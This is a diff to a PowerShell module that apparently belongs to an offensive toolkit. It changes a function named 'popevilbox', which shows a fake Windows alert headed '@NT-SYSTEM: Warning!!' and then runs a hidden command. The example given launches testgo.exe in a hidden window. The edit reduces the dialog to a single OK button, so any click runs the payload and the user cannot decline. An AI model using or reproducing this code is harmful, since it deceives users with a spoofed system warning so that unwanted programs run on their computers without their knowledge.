@@ -450,28 +450,21 @@ function uninstaller {
 Export-ModuleMember -Function uninstaller
 Set-Alias -Name uninstaller -Value uninstaller -Description "Run code for uninstaller"
 
-#popevilbox -Text "Check your system" -Header "@NT-SYSTEM: Warning!!" -Button "4" -Thing "powershell start-process .\testgo.exe -windowstyle hidden"
+#popevilbox -Text "Check your system" -Header "@NT-SYSTEM: Warning!!" -What "powershell start-process .\testgo.exe -windowstyle hidden"
 function popevilbox {
     param(
         [string]$Text,
         [string]$Header,
-        [string]$Button,
-        [string]$Thing
+        [string]$What
     )
     $Request = $Text
     $Hpoint =  $Header
-    $Number = $Button
-    $What = $Thing
+    $Thing = $What
     [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
-    $OUTPUT = [System.Windows.Forms.MessageBox]::Show("$Request", "$Hpoint", "$Button")
+    $OUTPUT = [System.Windows.Forms.MessageBox]::Show("$Request", "$Hpoint", "0")
 
-    if ($OUTPUT -eq [System.Windows.Forms.DialogResult]::Yes) {
+    if ($OUTPUT -eq [System.Windows.Forms.DialogResult]::Ok) {
         powershell -w 1 -c "$What" ;
-        # Uzavření System.Windows.Forms
-        [System.Windows.Forms.Application]::Exit()
-    }
-    
-    if ($OUTPUT -eq [System.Windows.Forms.DialogResult]::No) {
         # Uzavření System.Windows.Forms
         [System.Windows.Forms.Application]::Exit()
     }
